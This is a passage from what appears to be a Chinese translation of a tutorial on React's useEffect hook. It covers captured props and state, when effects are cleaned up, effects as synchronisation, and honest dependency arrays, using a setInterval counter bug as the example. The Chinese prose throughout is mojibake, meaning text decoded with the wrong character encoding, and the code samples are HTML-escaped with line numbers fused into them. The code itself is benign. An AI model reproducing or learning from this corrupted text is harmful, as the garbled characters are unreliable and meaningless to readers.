åœ¨ç»„ä»¶å†…ä»€ä¹ˆæ—¶å€™å»è¯»å–propsæˆ–è€…stateæ˜¯æ— å…³ç´§è¦çš„ã€‚å› ä¸ºå®ƒä»¬ä¸ä¼šæ”¹å˜ã€‚åœ¨å•æ¬¡æ¸²æŸ“çš„èŒƒå›´å†…ï¼Œpropså’Œstateå§‹ç»ˆä¿æŒä¸å˜ã€‚ï¼ˆè§£æ„èµ‹å€¼çš„propsä½¿å¾—è¿™ä¸€ç‚¹æ›´æ˜æ˜¾ã€‚ï¼‰ å½“ç„¶ï¼Œæœ‰æ—¶å€™ä½ å¯èƒ½æƒ³åœ¨effectçš„å›è°ƒå‡½æ•°é‡Œè¯»å–æœ€æ–°çš„å€¼è€Œä¸æ˜¯æ•è·çš„å€¼ã€‚æœ€ç®€å•çš„å®ç°æ–¹æ³•æ˜¯ä½¿ç”¨refsï¼Œè¿™ç¯‡æ–‡ç« çš„æœ€åä¸€éƒ¨åˆ†ä»‹ç»äº†ç›¸å…³å†…å®¹ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯å½“ä½ æƒ³è¦ä»è¿‡å»æ¸²æŸ“ä¸­çš„å‡½æ•°é‡Œè¯»å–æœªæ¥çš„propså’Œstateï¼Œä½ æ˜¯åœ¨é€†æ½®è€ŒåŠ¨ã€‚è™½ç„¶å®ƒå¹¶æ²¡æœ‰é”™ï¼ˆæœ‰æ—¶å€™å¯èƒ½ä¹Ÿéœ€è¦è¿™æ ·åšï¼‰ï¼Œä½†å®ƒå› ä¸ºæ‰“ç ´äº†é»˜è®¤èŒƒå¼ä¼šä½¿ä»£ç æ˜¾å¾—ä¸å¤Ÿâ€œå¹²å‡€â€ã€‚è¿™æ˜¯æˆ‘ä»¬æœ‰æ„ä¸ºä¹‹çš„ï¼Œå› ä¸ºå®ƒèƒ½å¸®åŠ©çªå‡ºå“ªäº›ä»£ç æ˜¯è„†å¼±çš„ï¼Œæ˜¯éœ€è¦ä¾èµ–æ—¶é—´æ¬¡åºçš„ã€‚åœ¨classä¸­ï¼Œå¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µå°±æ²¡é‚£ä¹ˆæ˜¾è€Œæ˜“è§äº†ã€‚ ä¸‹é¢è¿™ä¸ªè®¡æ•°å™¨ç‰ˆæœ¬ æ¨¡æ‹Ÿäº†classä¸­çš„è¡Œä¸ºï¼š 12345678function Example() &#123; const [count, setCount] = useState(0); const latestCount = useRef(count); useEffect(() =&gt; &#123; // Set the mutable latest value latestCount.current = count; setTimeout(() =&gt; &#123; // Read the mutable latest value console.log(`You clicked $&#123;latestCount.current&#125; times`); &#125;, 3000); &#125;); // ... åœ¨Reactä¸­å»ç›´æ¥ä¿®æ”¹å€¼çœ‹ä¸Šå»æœ‰ç‚¹æ€ªå¼‚ã€‚ç„¶è€Œï¼Œåœ¨classç»„ä»¶ä¸­Reactæ­£æ˜¯è¿™æ ·å»ä¿®æ”¹this.stateçš„ã€‚ä¸åƒæ•è·çš„propså’Œstateï¼Œä½ æ²¡æ³•ä¿è¯åœ¨ä»»æ„ä¸€ä¸ªå›è°ƒå‡½æ•°ä¸­è¯»å–çš„latestCount.currentæ˜¯ä¸å˜çš„ã€‚æ ¹æ®å®šä¹‰ï¼Œä½ å¯ä»¥éšæ—¶ä¿®æ”¹å®ƒã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå®ƒä¸æ˜¯é»˜è®¤è¡Œä¸ºï¼Œè€Œæ˜¯éœ€è¦ä½ ä¸»åŠ¨é€‰æ‹©è¿™æ ·åšã€‚ é‚£Effectä¸­çš„æ¸…ç†åˆæ˜¯æ€æ ·çš„å‘¢ï¼Ÿåƒ æ–‡æ¡£ä¸­è§£é‡Šçš„, æœ‰äº› effects å¯èƒ½éœ€è¦æœ‰ä¸€ä¸ªæ¸…ç†æ­¥éª¤ã€‚æœ¬è´¨ä¸Šï¼Œå®ƒçš„ç›®çš„æ˜¯æ¶ˆé™¤å‰¯ä½œç”¨ï¼ˆeffect)ï¼Œæ¯”å¦‚å–æ¶ˆè®¢é˜…ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç : 123456useEffect(() =&gt; &#123; ChatAPI.subscribeToFriendStatus(props.id, handleStatusChange); return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(props.id, handleStatusChange); &#125;;&#125;); å‡è®¾ç¬¬ä¸€æ¬¡æ¸²æŸ“çš„æ—¶å€™propsæ˜¯{id: 10}ï¼Œç¬¬äºŒæ¬¡æ¸²æŸ“çš„æ—¶å€™æ˜¯{id: 20}ã€‚ä½ å¯èƒ½ä¼šè®¤ä¸ºå‘ç”Ÿäº†ä¸‹é¢çš„è¿™äº›äº‹ï¼š React æ¸…é™¤äº† {id: 10}çš„effectã€‚ React æ¸²æŸ“{id: 20}çš„UIã€‚ React è¿è¡Œ{id: 20}çš„effectã€‚ (äº‹å®å¹¶ä¸æ˜¯è¿™æ ·ã€‚) å¦‚æœä¾èµ–è¿™ç§å¿ƒæ™ºæ¨¡å‹ï¼Œä½ å¯èƒ½ä¼šè®¤ä¸ºæ¸…é™¤è¿‡ç¨‹â€œçœ‹åˆ°â€çš„æ˜¯æ—§çš„propså› ä¸ºå®ƒæ˜¯åœ¨é‡æ–°æ¸²æŸ“ä¹‹å‰è¿è¡Œçš„ï¼Œæ–°çš„effectâ€œçœ‹åˆ°â€çš„æ˜¯æ–°çš„propså› ä¸ºå®ƒæ˜¯åœ¨é‡æ–°æ¸²æŸ“ä¹‹åè¿è¡Œçš„ã€‚è¿™ç§å¿ƒæ™ºæ¨¡å‹ç›´æ¥æ¥æºäºclassç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸã€‚ä¸è¿‡å®ƒå¹¶ä¸ç²¾ç¡®ã€‚è®©æˆ‘ä»¬æ¥ä¸€æ¢ç©¶ç«Ÿã€‚ Reactåªä¼šåœ¨æµè§ˆå™¨ç»˜åˆ¶åè¿è¡Œeffectsã€‚è¿™ä½¿å¾—ä½ çš„åº”ç”¨æ›´æµç•…å› ä¸ºå¤§å¤šæ•°effectså¹¶ä¸ä¼šé˜»å¡å±å¹•çš„æ›´æ–°ã€‚Effectçš„æ¸…é™¤åŒæ ·è¢«å»¶è¿Ÿäº†ã€‚ä¸Šä¸€æ¬¡çš„effectä¼šåœ¨é‡æ–°æ¸²æŸ“åè¢«æ¸…é™¤ï¼š React æ¸²æŸ“{id: 20}çš„UIã€‚ æµè§ˆå™¨ç»˜åˆ¶ã€‚æˆ‘ä»¬åœ¨å±å¹•ä¸Šçœ‹åˆ°{id: 20}çš„UIã€‚ React æ¸…é™¤{id: 10}çš„effectã€‚ React è¿è¡Œ{id: 20}çš„effectã€‚ ä½ å¯èƒ½ä¼šå¥½å¥‡ï¼šå¦‚æœæ¸…é™¤ä¸Šä¸€æ¬¡çš„effectå‘ç”Ÿåœ¨propså˜æˆ{id: 20}ä¹‹åï¼Œé‚£å®ƒä¸ºä»€ä¹ˆè¿˜èƒ½â€œçœ‹åˆ°â€æ—§çš„{id: 10}ï¼Ÿ ä½ æ›¾ç»æ¥è¿‡è¿™é‡Œâ€¦ ğŸ¤” å¼•ç”¨ä¸ŠåŠéƒ¨åˆ†å¾—åˆ°çš„ç»“è®º: ç»„ä»¶å†…çš„æ¯ä¸€ä¸ªå‡½æ•°ï¼ˆåŒ…æ‹¬äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œeffectsï¼Œå®šæ—¶å™¨æˆ–è€…APIè°ƒç”¨ç­‰ç­‰ï¼‰ä¼šæ•è·å®šä¹‰å®ƒä»¬çš„é‚£æ¬¡æ¸²æŸ“ä¸­çš„propså’Œstateã€‚ ç°åœ¨ç­”æ¡ˆæ˜¾è€Œæ˜“è§ã€‚effectçš„æ¸…é™¤å¹¶ä¸ä¼šè¯»å–â€œæœ€æ–°â€çš„propsã€‚å®ƒåªèƒ½è¯»å–åˆ°å®šä¹‰å®ƒçš„é‚£æ¬¡æ¸²æŸ“ä¸­çš„propså€¼ï¼š 123456789101112131415161718192021222324252627// First render, props are &#123;id: 10&#125;function Example() &#123; // ... useEffect( // Effect from first render () =&gt; &#123; ChatAPI.subscribeToFriendStatus(10, handleStatusChange); // Cleanup for effect from first render return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(10, handleStatusChange); &#125;; &#125; ); // ...&#125;// Next render, props are &#123;id: 20&#125;function Example() &#123; // ... useEffect( // Effect from second render () =&gt; &#123; ChatAPI.subscribeToFriendStatus(20, handleStatusChange); // Cleanup for effect from second render return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(20, handleStatusChange); &#125;; &#125; ); // ...&#125; ç‹å›½ä¼šå´›èµ·è½¬è€Œå¤å½’å°˜åœŸï¼Œå¤ªé˜³ä¼šè„±è½å¤–å±‚å˜ä¸ºç™½çŸ®æ˜Ÿï¼Œæœ€åçš„æ–‡æ˜ä¹Ÿè¿Ÿæ—©ä¼šç»“æŸã€‚ä½†æ˜¯ç¬¬ä¸€æ¬¡æ¸²æŸ“ä¸­effectçš„æ¸…é™¤å‡½æ•°åªèƒ½çœ‹åˆ°{id: 10}è¿™ä¸ªpropsã€‚ è¿™æ­£æ˜¯ä¸ºä»€ä¹ˆReactèƒ½åšåˆ°åœ¨ç»˜åˆ¶åç«‹å³å¤„ç†effects â€” å¹¶ä¸”é»˜è®¤æƒ…å†µä¸‹ä½¿ä½ çš„åº”ç”¨è¿è¡Œæ›´æµç•…ã€‚å¦‚æœä½ çš„ä»£ç éœ€è¦ä¾ç„¶å¯ä»¥è®¿é—®åˆ°è€çš„propsã€‚ åŒæ­¥ï¼Œ è€Œéç”Ÿå‘½å‘¨æœŸæˆ‘æœ€å–œæ¬¢Reactçš„ä¸€ç‚¹æ˜¯å®ƒç»Ÿä¸€æè¿°äº†åˆå§‹æ¸²æŸ“å’Œä¹‹åçš„æ›´æ–°ã€‚è¿™é™ä½äº†ä½ ç¨‹åºçš„ç†µã€‚ æ¯”å¦‚æˆ‘æœ‰ä¸ªç»„ä»¶åƒä¸‹é¢è¿™æ ·ï¼š 1234567function Greeting(&#123; name &#125;) &#123; return ( &lt;h1 className="Greeting"&gt; Hello, &#123;name&#125; &lt;/h1&gt; );&#125; æˆ‘å…ˆæ¸²æŸ“ç„¶åæ¸²æŸ“ï¼Œå’Œæˆ‘ç›´æ¥æ¸²æŸ“``å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸­ï¼Œæˆ‘æœ€åçœ‹åˆ°çš„éƒ½æ˜¯â€œHello, Yuzhiâ€ã€‚ äººä»¬æ€»æ˜¯è¯´ï¼šâ€œé‡è¦çš„æ˜¯æ—…è¡Œè¿‡ç¨‹ï¼Œè€Œä¸æ˜¯ç›®çš„åœ°â€ã€‚åœ¨Reactä¸–ç•Œä¸­ï¼Œæ°å¥½ç›¸åã€‚é‡è¦çš„æ˜¯ç›®çš„ï¼Œè€Œä¸æ˜¯è¿‡ç¨‹ã€‚è¿™å°±æ˜¯JQueryä»£ç ä¸­ $.addClass æˆ– $.removeClassè¿™æ ·çš„è°ƒç”¨ï¼ˆè¿‡ç¨‹ï¼‰å’ŒReactä»£ç ä¸­å£°æ˜CSSç±»ååº”è¯¥æ˜¯ä»€ä¹ˆï¼ˆç›®çš„ï¼‰ä¹‹é—´çš„åŒºåˆ«ã€‚ Reactä¼šæ ¹æ®æˆ‘ä»¬å½“å‰çš„propså’ŒstateåŒæ­¥åˆ°DOMã€‚â€œmountâ€å’Œâ€œupdateâ€ä¹‹äºæ¸²æŸ“å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚ ä½ åº”è¯¥ä»¥ç›¸åŒçš„æ–¹å¼å»æ€è€ƒeffectsã€‚useEffectä½¿ä½ èƒ½å¤Ÿæ ¹æ®propså’Œstate*åŒæ­¥*React treeä¹‹å¤–çš„ä¸œè¥¿ã€‚ 1234567function Greeting(&#123; name &#125;) &#123; useEffect(() =&gt; &#123; document.title = 'Hello, ' + name; &#125;); return ( &lt;h1 className="Greeting"&gt; Hello, &#123;name&#125; &lt;/h1&gt; );&#125; è¿™å°±æ˜¯å’Œå¤§å®¶ç†ŸçŸ¥çš„mount/update/unmountå¿ƒæ™ºæ¨¡å‹ä¹‹é—´ç»†å¾®çš„åŒºåˆ«ã€‚ç†è§£å’Œå†…åŒ–è¿™ç§åŒºåˆ«æ˜¯éå¸¸é‡è¦çš„ã€‚å¦‚æœä½ è¯•å›¾å†™ä¸€ä¸ªeffectä¼šæ ¹æ®æ˜¯å¦ç¬¬ä¸€æ¬¡æ¸²æŸ“è€Œè¡¨ç°ä¸ä¸€è‡´ï¼Œä½ æ­£åœ¨é€†æ½®è€ŒåŠ¨ã€‚å¦‚æœæˆ‘ä»¬çš„ç»“æœä¾èµ–äºè¿‡ç¨‹è€Œä¸æ˜¯ç›®çš„ï¼Œæˆ‘ä»¬ä¼šåœ¨åŒæ­¥ä¸­çŠ¯é”™ã€‚ å…ˆæ¸²æŸ“å±æ€§Aï¼ŒBå†æ¸²æŸ“Cï¼Œå’Œç«‹å³æ¸²æŸ“Cå¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚è™½ç„¶ä»–ä»¬å¯èƒ½çŸ­æš‚åœ°ä¼šæœ‰ç‚¹ä¸åŒï¼ˆæ¯”å¦‚è¯·æ±‚æ•°æ®æ—¶ï¼‰ï¼Œä½†æœ€ç»ˆçš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚ ä¸è¿‡è¯è¯´å›æ¥ï¼Œåœ¨æ¯ä¸€æ¬¡æ¸²æŸ“åéƒ½å»è¿è¡Œæ‰€æœ‰çš„effectså¯èƒ½å¹¶ä¸é«˜æ•ˆã€‚ï¼ˆå¹¶ä¸”åœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œå®ƒå¯èƒ½ä¼šå¯¼è‡´æ— é™å¾ªç¯ã€‚ï¼‰ æ‰€ä»¥æˆ‘ä»¬è¯¥æ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿ å‘Šè¯‰Reactå»æ¯”å¯¹ä½ çš„Effectså…¶å®æˆ‘ä»¬å·²ç»ä»Reactå¤„ç†DOMçš„æ–¹å¼ä¸­å­¦ä¹ åˆ°äº†è§£å†³åŠæ³•ã€‚Reactåªä¼šæ›´æ–°DOMçœŸæ­£å‘ç”Ÿæ”¹å˜çš„éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯æ¯æ¬¡æ¸²æŸ“éƒ½å¤§åŠ¨å¹²æˆˆã€‚ å½“ä½ æŠŠ 123&lt;h1 className="Greeting"&gt; Hello, Dan&lt;/h1&gt; æ›´æ–°åˆ° 123&lt;h1 className="Greeting"&gt; Hello, Yuzhi&lt;/h1&gt; React èƒ½å¤Ÿçœ‹åˆ°ä¸¤ä¸ªå¯¹è±¡: 12const oldProps = &#123;className: 'Greeting', children: 'Hello, Dan'&#125;;const newProps = &#123;className: 'Greeting', children: 'Hello, Yuzhi'&#125;; å®ƒä¼šæ£€æµ‹æ¯ä¸€ä¸ªpropsï¼Œå¹¶ä¸”å‘ç°childrenå‘ç”Ÿæ”¹å˜éœ€è¦æ›´æ–°DOMï¼Œä½†classNameå¹¶æ²¡æœ‰ã€‚æ‰€ä»¥å®ƒåªéœ€è¦è¿™æ ·åšï¼š 12domNode.innerText = 'Hello, Yuzhi';// No need to touch domNode.className æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ç±»ä¼¼çš„æ–¹å¼å¤„ç†effectså—ï¼Ÿå¦‚æœèƒ½å¤Ÿåœ¨ä¸éœ€è¦çš„æ—¶å€™é¿å…è°ƒç”¨effectå°±å¤ªå¥½äº†ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬çš„ç»„ä»¶å¯èƒ½å› ä¸ºçŠ¶æ€å˜æ›´è€Œé‡æ–°æ¸²æŸ“ï¼š 12345678910111213function Greeting(&#123; name &#125;) &#123; const [counter, setCounter] = useState(0); useEffect(() =&gt; &#123; document.title = 'Hello, ' + name; &#125;); return ( &lt;h1 className="Greeting"&gt; Hello, &#123;name&#125; &lt;button onClick=&#123;() =&gt; setCounter(counter + 1)&#125;&gt; Increment &lt;/button&gt; &lt;/h1&gt; );&#125; ä½†æ˜¯æˆ‘ä»¬çš„effectå¹¶æ²¡æœ‰ä½¿ç”¨counterè¿™ä¸ªçŠ¶æ€ã€‚æˆ‘ä»¬çš„effectåªä¼šåŒæ­¥nameå±æ€§ç»™document.titleï¼Œä½†nameå¹¶æ²¡æœ‰å˜ã€‚åœ¨æ¯ä¸€æ¬¡counteræ”¹å˜åé‡æ–°ç»™document.titleèµ‹å€¼å¹¶ä¸æ˜¯ç†æƒ³çš„åšæ³•ã€‚ å¥½äº†ï¼Œé‚£Reactå¯ä»¥â€¦åŒºåˆ†effectsçš„ä¸åŒå—ï¼Ÿ 123let oldEffect = () =&gt; &#123; document.title = 'Hello, Dan'; &#125;;let newEffect = () =&gt; &#123; document.title = 'Hello, Dan'; &#125;;// Can React see these functions do the same thing? å¹¶ä¸èƒ½ã€‚Reactå¹¶ä¸èƒ½çŒœæµ‹åˆ°å‡½æ•°åšäº†ä»€ä¹ˆå¦‚æœä¸å…ˆè°ƒç”¨çš„è¯ã€‚ï¼ˆæºç ä¸­å¹¶æ²¡æœ‰åŒ…å«ç‰¹æ®Šçš„å€¼ï¼Œå®ƒä»…ä»…æ˜¯å¼•ç”¨äº†nameå±æ€§ã€‚ï¼‰ è¿™æ˜¯ä¸ºä»€ä¹ˆä½ å¦‚æœæƒ³è¦é¿å…effectsä¸å¿…è¦çš„é‡å¤è°ƒç”¨ï¼Œä½ å¯ä»¥æä¾›ç»™useEffectä¸€ä¸ªä¾èµ–æ•°ç»„å‚æ•°(deps)ï¼š 123useEffect(() =&gt; &#123; document.title = 'Hello, ' + name;&#125;, [name]); // Our deps è¿™å¥½æ¯”ä½ å‘Šè¯‰Reactï¼šâ€œHeyï¼Œæˆ‘çŸ¥é“ä½ çœ‹ä¸åˆ°è¿™ä¸ªå‡½æ•°é‡Œçš„ä¸œè¥¿ï¼Œä½†æˆ‘å¯ä»¥ä¿è¯åªä½¿ç”¨äº†æ¸²æŸ“ä¸­çš„nameï¼Œåˆ«æ— å…¶ä»–ã€‚â€ å¦‚æœå½“å‰æ¸²æŸ“ä¸­çš„è¿™äº›ä¾èµ–é¡¹å’Œä¸Šä¸€æ¬¡è¿è¡Œè¿™ä¸ªeffectçš„æ—¶å€™å€¼ä¸€æ ·ï¼Œå› ä¸ºæ²¡æœ‰ä»€ä¹ˆéœ€è¦åŒæ­¥Reactä¼šè‡ªåŠ¨è·³è¿‡è¿™æ¬¡effectï¼š 12345678const oldEffect = () =&gt; &#123; document.title = 'Hello, Dan'; &#125;;const oldDeps = ['Dan'];const newEffect = () =&gt; &#123; document.title = 'Hello, Dan'; &#125;;const newDeps = ['Dan'];// React can't peek inside of functions, but it can compare deps.// Since all deps are the same, it doesnâ€™t need to run the new effect. å³ä½¿ä¾èµ–æ•°ç»„ä¸­åªæœ‰ä¸€ä¸ªå€¼åœ¨ä¸¤æ¬¡æ¸²æŸ“ä¸­ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬ä¹Ÿä¸èƒ½è·³è¿‡effectçš„è¿è¡Œã€‚è¦åŒæ­¥æ‰€æœ‰ï¼ å…³äºä¾èµ–é¡¹ä¸è¦å¯¹Reactæ’’è°å…³äºä¾èµ–é¡¹å¯¹Reactæ’’è°ä¼šæœ‰ä¸å¥½çš„ç»“æœã€‚ç›´è§‰ä¸Šï¼Œè¿™å¾ˆå¥½ç†è§£ï¼Œä½†æˆ‘æ›¾çœ‹åˆ°å‡ ä¹æ‰€æœ‰ä¾èµ–classå¿ƒæ™ºæ¨¡å‹ä½¿ç”¨useEffectçš„äººéƒ½è¯•å›¾è¿åè¿™ä¸ªè§„åˆ™ã€‚ï¼ˆæˆ‘åˆšå¼€å§‹ä¹Ÿè¿™ä¹ˆå¹²äº†ï¼ï¼‰ 1234567891011function SearchResults() &#123; async function fetchData() &#123; // ... &#125; useEffect(() =&gt; &#123; fetchData(); &#125;, []); // Is this okay? Not always -- and there's a better way to write it. // ...&#125; (å®˜ç½‘çš„ Hooks FAQ è§£é‡Šäº†åº”è¯¥æ€ä¹ˆåšã€‚ æˆ‘ä»¬åœ¨ä¸‹é¢ä¼šé‡æ–°å›é¡¾è¿™ä¸ªä¾‹å­ã€‚) â€œä½†æˆ‘åªæ˜¯æƒ³åœ¨æŒ‚è½½çš„æ—¶å€™è¿è¡Œå®ƒï¼â€ï¼Œä½ å¯èƒ½ä¼šè¯´ã€‚ç°åœ¨åªéœ€è¦è®°ä½ï¼šå¦‚æœä½ è®¾ç½®äº†ä¾èµ–é¡¹ï¼Œeffectä¸­ç”¨åˆ°çš„æ‰€æœ‰ç»„ä»¶å†…çš„å€¼éƒ½è¦åŒ…å«åœ¨ä¾èµ–ä¸­ã€‚è¿™åŒ…æ‹¬propsï¼Œstateï¼Œå‡½æ•° â€” ç»„ä»¶å†…çš„ä»»ä½•ä¸œè¥¿ã€‚ æœ‰æ—¶å€™ä½ æ˜¯è¿™æ ·åšäº†ï¼Œä½†å¯èƒ½ä¼šå¼•èµ·ä¸€ä¸ªé—®é¢˜ã€‚æ¯”å¦‚ï¼Œä½ å¯èƒ½ä¼šé‡åˆ°æ— é™è¯·æ±‚çš„é—®é¢˜ï¼Œæˆ–è€…socketè¢«é¢‘ç¹åˆ›å»ºçš„é—®é¢˜ã€‚è§£å†³é—®é¢˜çš„æ–¹æ³•ä¸æ˜¯ç§»é™¤ä¾èµ–é¡¹ã€‚æˆ‘ä»¬ä¼šå¾ˆå¿«äº†è§£å…·ä½“çš„è§£å†³æ–¹æ¡ˆã€‚ ä¸è¿‡åœ¨æˆ‘ä»¬æ·±å…¥è§£å†³æ–¹æ¡ˆä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå°è¯•æ›´å¥½åœ°ç†è§£é—®é¢˜ã€‚ å¦‚æœè®¾ç½®äº†é”™è¯¯çš„ä¾èµ–ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿå¦‚æœä¾èµ–é¡¹åŒ…å«äº†æ‰€æœ‰effectä¸­ä½¿ç”¨åˆ°çš„å€¼ï¼ŒReactå°±èƒ½çŸ¥é“ä½•æ—¶éœ€è¦è¿è¡Œå®ƒï¼š 123useEffect(() =&gt; &#123; document.title = 'Hello, ' + name;&#125;, [name]); (ä¾èµ–å‘ç”Ÿäº†å˜æ›´ï¼Œæ‰€ä»¥ä¼šé‡æ–°è¿è¡Œeffectã€‚) ä½†æ˜¯å¦‚æœæˆ‘ä»¬å°†[]è®¾ä¸ºeffectçš„ä¾èµ–ï¼Œæ–°çš„effectå‡½æ•°ä¸ä¼šè¿è¡Œï¼š 123useEffect(() =&gt; &#123; document.title = 'Hello, ' + name;&#125;, []); // Wrong: name is missing in deps (ä¾èµ–æ²¡æœ‰å˜ï¼Œæ‰€ä»¥ä¸ä¼šå†æ¬¡è¿è¡Œeffectã€‚) åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œé—®é¢˜çœ‹èµ·æ¥æ˜¾è€Œæ˜“è§ã€‚ä½†åœ¨æŸäº›æƒ…å†µä¸‹å¦‚æœä½ è„‘å­é‡Œâ€œè·³å‡ºâ€classç»„ä»¶çš„è§£å†³åŠæ³•ï¼Œä½ çš„ç›´è§‰å¾ˆå¯èƒ½ä¼šæ¬ºéª—ä½ ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æ¥å†™ä¸€ä¸ªæ¯ç§’é€’å¢çš„è®¡æ•°å™¨ã€‚åœ¨Classç»„ä»¶ä¸­ï¼Œæˆ‘ä»¬çš„ç›´è§‰æ˜¯ï¼šâ€œå¼€å¯ä¸€æ¬¡å®šæ—¶å™¨ï¼Œæ¸…é™¤ä¹Ÿæ˜¯ä¸€æ¬¡â€ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªä¾‹å­è¯´æ˜æ€ä¹ˆå®ç°å®ƒã€‚å½“æˆ‘ä»¬ç†æ‰€å½“ç„¶åœ°æŠŠå®ƒç”¨useEffectçš„æ–¹å¼ç¿»è¯‘ï¼Œç›´è§‰ä¸Šæˆ‘ä»¬ä¼šè®¾ç½®ä¾èµ–ä¸º[]ã€‚â€œæˆ‘åªæƒ³è¿è¡Œä¸€æ¬¡effectâ€ï¼Œå¯¹å—ï¼Ÿ 1234567891011function Counter() &#123; const [count, setCount] = useState(0); useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(count + 1); &#125;, 1000); return () =&gt; clearInterval(id); &#125;, []); return &lt;h1&gt;&#123;count&#125;&lt;/h1&gt;;&#125; ç„¶è€Œï¼Œè¿™ä¸ªä¾‹å­åªä¼šé€’å¢ä¸€æ¬¡ã€‚å¤©äº†å™œã€‚ å¦‚æœä½ çš„å¿ƒæ™ºæ¨¡å‹æ˜¯â€œåªæœ‰å½“æˆ‘æƒ³é‡æ–°è§¦å‘effectçš„æ—¶å€™æ‰éœ€è¦å»è®¾ç½®ä¾èµ–â€ï¼Œè¿™ä¸ªä¾‹å­å¯èƒ½ä¼šè®©ä½ äº§ç”Ÿå­˜åœ¨å±æœºã€‚ä½ æƒ³è¦è§¦å‘ä¸€æ¬¡å› ä¸ºå®ƒæ˜¯å®šæ—¶å™¨ â€” ä½†ä¸ºä»€ä¹ˆä¼šæœ‰é—®é¢˜ï¼Ÿ å¦‚æœä½ çŸ¥é“ä¾èµ–æ˜¯æˆ‘ä»¬ç»™Reactçš„æš—ç¤ºï¼Œå‘Šè¯‰å®ƒeffectæ‰€æœ‰éœ€è¦ä½¿ç”¨çš„æ¸²æŸ“ä¸­çš„å€¼ï¼Œä½ å°±ä¸ä¼šåƒæƒŠäº†ã€‚effectä¸­ä½¿ç”¨äº†countä½†æˆ‘ä»¬æ’’è°è¯´å®ƒæ²¡æœ‰ä¾èµ–ã€‚å¦‚æœæˆ‘ä»¬è¿™æ ·åšè¿Ÿæ—©ä¼šå‡ºå¹ºè›¾å­ã€‚ åœ¨ç¬¬ä¸€æ¬¡æ¸²æŸ“ä¸­ï¼Œcountæ˜¯0ã€‚å› æ­¤ï¼ŒsetCount(count + 1)åœ¨ç¬¬ä¸€æ¬¡æ¸²æŸ“ä¸­ç­‰ä»·äºsetCount(0 + 1)ã€‚æ—¢ç„¶æˆ‘ä»¬è®¾ç½®äº†[]ä¾èµ–ï¼Œeffectä¸ä¼šå†é‡æ–°è¿è¡Œï¼Œå®ƒåé¢æ¯ä¸€ç§’éƒ½ä¼šè°ƒç”¨setCount(0 + 1) ï¼š 12345678910111213141516171819202122232425262728// First render, state is 0function Counter() &#123; // ... useEffect( // Effect from first render () =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(0 + 1); // Always setCount(1) &#125;, 1000); return () =&gt; clearInterval(id); &#125;, [] // Never re-runs ); // ...&#125;// Every next render, state is 1function Counter() &#123; // ... useEffect( // This effect is always ignored because // we lied to React about empty deps. () =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(1 + 1); &#125;, 1000); return () =&gt; clearInterval(id); &#125;, [] ); // ...&#125; æˆ‘ä»¬å¯¹Reactæ’’è°è¯´æˆ‘ä»¬çš„effectä¸ä¾èµ–ç»„ä»¶å†…çš„ä»»ä½•å€¼ï¼Œå¯å®é™…ä¸Šæˆ‘ä»¬çš„effectæœ‰ä¾èµ–ï¼ æˆ‘ä»¬çš„effectä¾èµ–count - å®ƒæ˜¯ç»„ä»¶å†…çš„å€¼ï¼ˆä¸è¿‡åœ¨effectå¤–é¢å®šä¹‰ï¼‰ï¼š 123456const count = // ...useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(count + 1); &#125;, 1000); return () =&gt; clearInterval(id);&#125;, []); å› æ­¤ï¼Œè®¾ç½®[]ä¸ºä¾èµ–ä¼šå¼•å…¥ä¸€ä¸ªbugã€‚Reactä¼šå¯¹æ¯”ä¾èµ–ï¼Œå¹¶ä¸”è·³è¿‡åé¢çš„effectï¼š (ä¾èµ–æ²¡æœ‰å˜ï¼Œæ‰€ä»¥ä¸ä¼šå†æ¬¡è¿è¡Œeffectã€‚) ç±»ä¼¼äºè¿™æ ·çš„é—®é¢˜æ˜¯å¾ˆéš¾è¢«æƒ³åˆ°çš„ã€‚å› æ­¤ï¼Œæˆ‘é¼“åŠ±ä½ å°†è¯šå®åœ°å‘ŠçŸ¥effectä¾èµ–ä½œä¸ºä¸€æ¡ç¡¬æ€§è§„åˆ™ï¼Œå¹¶ä¸”è¦åˆ—å‡ºæ‰€ä»¥ä¾èµ–ã€‚ï¼ˆæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªlintè§„åˆ™å¦‚æœä½ æƒ³åœ¨ä½ çš„å›¢é˜Ÿå†…åšç¡¬æ€§è§„å®šã€‚ï¼‰ ä¸¤ç§è¯šå®å‘ŠçŸ¥ä¾èµ–çš„æ–¹æ³•æœ‰ä¸¤ç§è¯šå®å‘ŠçŸ¥ä¾èµ–çš„ç­–ç•¥ã€‚ä½ åº”è¯¥ä»ç¬¬ä¸€ç§å¼€å§‹ï¼Œç„¶ååœ¨éœ€è¦çš„æ—¶å€™åº”ç”¨ç¬¬äºŒç§ã€‚ ç¬¬ä¸€ç§ç­–ç•¥æ˜¯åœ¨ä¾èµ–ä¸­åŒ…å«æ‰€æœ‰effectä¸­ç”¨åˆ°çš„ç»„ä»¶å†…çš„å€¼ã€‚è®©æˆ‘ä»¬åœ¨ä¾èµ–ä¸­åŒ…å«countï¼š 